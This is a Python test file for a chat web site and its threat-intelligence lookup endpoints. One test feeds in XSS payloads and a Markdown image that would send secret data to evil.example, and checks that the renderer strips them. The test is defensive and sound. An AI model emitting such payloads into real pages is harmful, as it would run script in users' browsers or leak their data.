"""The web site, driven over HTTP against the real graph and a real database.

Only the model is scripted. The site's job is to carry a message into the graph
and an answer back out, so everything between those two points stays real.
"""

import asyncio
from collections.abc import Awaitable, Callable
from pathlib import Path
from typing import Any
from unittest.mock import Mock
from uuid import uuid4

import httpx
from langchain_core.messages import AIMessage
from langchain_core.tools import BaseTool, tool
from langgraph.checkpoint.sqlite.aio import AsyncSqliteSaver

from oris.chat import create_oris_graph
from oris.web import create_app


def _model(answer: str | Exception) -> Mock:
    model = Mock()
    if isinstance(answer, Exception):
        model.invoke.side_effect = answer
    else:
        model.invoke.return_value = AIMessage(content=answer)
    return model


async def _threatsyft_not_used() -> dict[str, BaseTool]:
    raise AssertionError("this test should not reach ThreatSyft")


def _visit(
    tmp_path: Path,
    model: Mock,
    visit: Callable[[httpx.AsyncClient], Awaitable[Any]],
    load_threatsyft: Callable[
        [], Awaitable[dict[str, BaseTool]]
    ] = _threatsyft_not_used,
) -> Any:
    async def run() -> Any:
        database_path = tmp_path / "checkpoints.sqlite"
        async with AsyncSqliteSaver.from_conn_string(str(database_path)) as saver:
            graph = create_oris_graph(Mock(), Mock(), Mock(), model, checkpointer=saver)
            transport = httpx.ASGITransport(
                app=create_app(graph, database_path, load_threatsyft)
            )
            async with httpx.AsyncClient(
                transport=transport, base_url="http://oris"
            ) as client:
                return await visit(client)

    return asyncio.run(run())


def test_a_message_is_answered_by_plain_chat_with_formatting(tmp_path: Path) -> None:
    """The model answers directly, with no routing, and Markdown becomes HTML."""
    model = _model("This is **bold**.")

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.post(f"/api/chat/{uuid4()}", json={"text": "Hello"})

    response = _visit(tmp_path, model, visit)

    assert response.status_code == 200
    assert "<strong>bold</strong>" in response.json()["html"]
    assert model.invoke.call_args.args[0][-1].content == "Hello"
    model.with_structured_output.return_value.invoke.assert_not_called()


def test_a_conversation_comes_back_and_stays_separate(tmp_path: Path) -> None:
    """Reloading shows this conversation's turns and no other conversation's."""
    conversation, other = uuid4(), uuid4()
    model = _model("An *answer*.")

    async def visit(client: httpx.AsyncClient) -> tuple[Any, Any]:
        await client.post(f"/api/chat/{conversation}", json={"text": "<b>Hi</b>"})
        kept = await client.get(f"/api/chat/{conversation}")
        empty = await client.get(f"/api/chat/{other}")
        return kept.json(), empty.json()

    kept, empty = _visit(tmp_path, model, visit)

    assert kept["messages"][0] == {"role": "you", "text": "<b>Hi</b>"}
    assert kept["messages"][1]["role"] == "oris"
    assert "<em>answer</em>" in kept["messages"][1]["html"]
    assert empty["messages"] == []


def test_an_answer_cannot_put_html_or_images_on_the_page(tmp_path: Path) -> None:
    """Answers can carry text from the open web, so none of it may run or load."""
    model = _model(
        "<script>alert(1)</script>\n\n"
        "<img src=x onerror=alert(1)>\n\n"
        "![leak](https://evil.example/?data=secret)\n"
    )

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.post(f"/api/chat/{uuid4()}", json={"text": "Hello"})

    rendered = _visit(tmp_path, model, visit).json()["html"]

    assert "<script" not in rendered
    assert "<img" not in rendered


def test_a_table_in_an_answer_is_drawn_as_a_table(tmp_path: Path) -> None:
    """Models answer in tables often, and plain Markdown leaves them as pipes."""
    model = _model("| a | b |\n|---|---|\n| 1 | 2 |\n")

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.post(f"/api/chat/{uuid4()}", json={"text": "Hello"})

    assert "<table>" in _visit(tmp_path, model, visit).json()["html"]


def test_a_failed_turn_says_why_and_leaves_no_trace(tmp_path: Path) -> None:
    """The reader sees the reason, and the failed request is not in the history."""
    conversation = uuid4()
    model = _model(RuntimeError("model offline"))

    async def visit(client: httpx.AsyncClient) -> tuple[httpx.Response, Any]:
        failed = await client.post(f"/api/chat/{conversation}", json={"text": "Hi"})
        history = await client.get(f"/api/chat/{conversation}")
        return failed, history.json()

    failed, history = _visit(tmp_path, model, visit)

    assert failed.status_code == 502
    assert "model offline" in failed.json()["error"]
    assert history["messages"] == []


def test_the_address_of_the_site_opens_a_new_conversation(tmp_path: Path) -> None:
    """Each visit gets its own conversation, whose page can then be loaded."""

    async def visit(client: httpx.AsyncClient) -> tuple[str, str, httpx.Response]:
        first = (await client.get("/")).headers["location"]
        second = (await client.get("/")).headers["location"]
        return first, second, await client.get(first)

    first, second, page = _visit(tmp_path, _model("unused"), visit)

    assert first.startswith("/chat/")
    assert first != second
    assert page.status_code == 200
    assert "text/html" in page.headers["content-type"]


ENRICHED = {
    "ok": True,
    "tool": "enrich",
    "query": {"indicator": "8.8.8.8"},
    "data": {
        "indicator": "8.8.8.8",
        "indicator_type": "ip",
        "source_summary": {"ok": 1, "failed": 1},
        "sources": {
            "dns": {"ok": True, "data": {"names": ["dns.google"]}},
            "shodan": {
                "ok": False,
                "code": "authentication_error",
                "message": "Shodan rejected the configured API key.",
                "details": {"status_code": 401},
            },
        },
        "warnings": [],
    },
    "error": None,
}

LOOKED_UP = {
    "ok": True,
    "tool": "lookup",
    "query": {"reference": "APT29"},
    "data": {
        "reference": "APT29",
        "reference_type": "name",
        "source_summary": {"ok": 1, "failed": 1},
        "sources": {
            "misp_actor": {"ok": True, "data": {"name": "APT29"}},
            "ransomware": {
                "ok": False,
                "code": "not_found",
                "message": "APT29 does not appear in the local leak-site claims.",
            },
        },
        "warnings": [],
    },
    "error": None,
}


def _threatsyft(calls: list[str]) -> Callable[[], Awaitable[dict[str, BaseTool]]]:
    """Real LangChain tools answering the way the MCP adapter's tools do."""

    @tool("enrich", response_format="content_and_artifact")
    async def enrich(indicator: str) -> tuple[str, dict[str, Any]]:
        """Stand in for ThreatSyft's enrich tool."""
        calls.append(indicator)
        return "", {"structured_content": ENRICHED}

    @tool("lookup", response_format="content_and_artifact")
    async def lookup(reference: str) -> tuple[str, dict[str, Any]]:
        """Stand in for ThreatSyft's lookup tool."""
        calls.append(reference)
        return "", {"structured_content": LOOKED_UP}

    async def load() -> dict[str, BaseTool]:
        return {"enrich": enrich, "lookup": lookup}

    return load


def test_a_lookup_shows_exactly_what_threatsyft_returned(tmp_path: Path) -> None:
    """Every source arrives unaltered and in order, including the failed ones."""
    calls: list[str] = []

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.post("/api/tools/enrich", json={"indicator": "8.8.8.8"})

    response = _visit(tmp_path, _model("unused"), visit, _threatsyft(calls))

    assert response.status_code == 200
    assert response.json() == ENRICHED
    assert list(response.json()["data"]["sources"]) == ["dns", "shodan"]
    assert calls == ["8.8.8.8"]


def test_a_cve_or_threat_actor_goes_to_threatsyfts_lookup_tool(tmp_path: Path) -> None:
    """References use lookup, and its result arrives unaltered."""
    calls: list[str] = []

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.post("/api/tools/lookup", json={"reference": "APT29"})

    response = _visit(tmp_path, _model("unused"), visit, _threatsyft(calls))

    assert response.status_code == 200
    assert response.json() == LOOKED_UP
    assert calls == ["APT29"]


def test_the_page_can_only_reach_the_tools_it_offers(tmp_path: Path) -> None:
    """Any other ThreatSyft tool is refused before anything is connected."""
    loads: list[int] = []

    async def counted_load() -> dict[str, BaseTool]:
        loads.append(1)
        return {}

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.post("/api/tools/extract_iocs", json={"text": "1.1.1.1"})

    response = _visit(tmp_path, _model("unused"), visit, counted_load)

    assert response.status_code == 404
    assert loads == []


def test_threatsyft_connects_on_the_first_lookup_and_only_once(
    tmp_path: Path,
) -> None:
    """The site starts without ThreatSyft, and lookups reuse one connection."""
    loads: list[int] = []
    load_tool = _threatsyft([])

    async def counted_load() -> dict[str, BaseTool]:
        loads.append(1)
        return await load_tool()

    async def visit(client: httpx.AsyncClient) -> tuple[int, int]:
        await client.get("/tools")
        before = len(loads)
        for _ in range(2):
            await client.post("/api/tools/enrich", json={"indicator": "8.8.8.8"})
        return before, len(loads)

    assert _visit(tmp_path, _model("unused"), visit, counted_load) == (0, 1)


def test_threatsyft_being_unavailable_says_why_and_chat_still_works(
    tmp_path: Path,
) -> None:
    """A missing lookup service costs the lookup, not the rest of the site."""

    async def unavailable() -> dict[str, BaseTool]:
        raise ValueError("THREATSYFT_ROOT is required")

    async def visit(client: httpx.AsyncClient) -> tuple[httpx.Response, int]:
        failed = await client.post("/api/tools/enrich", json={"indicator": "8.8.8.8"})
        chat = await client.post(f"/api/chat/{uuid4()}", json={"text": "Hello"})
        return failed, chat.status_code

    failed, chat_status = _visit(tmp_path, _model("Hi."), visit, unavailable)

    assert failed.status_code == 502
    assert "THREATSYFT_ROOT is required" in failed.json()["error"]
    assert chat_status == 200


def test_the_tools_page_and_shared_styles_are_served(tmp_path: Path) -> None:
    """Both pages depend on these files existing where the site says they are."""

    async def visit(client: httpx.AsyncClient) -> tuple[httpx.Response, httpx.Response]:
        return await client.get("/tools"), await client.get("/web.css")

    page, styles = _visit(tmp_path, _model("unused"), visit)

    assert page.status_code == 200
    assert "text/html" in page.headers["content-type"]
    assert styles.status_code == 200
    assert "text/css" in styles.headers["content-type"]
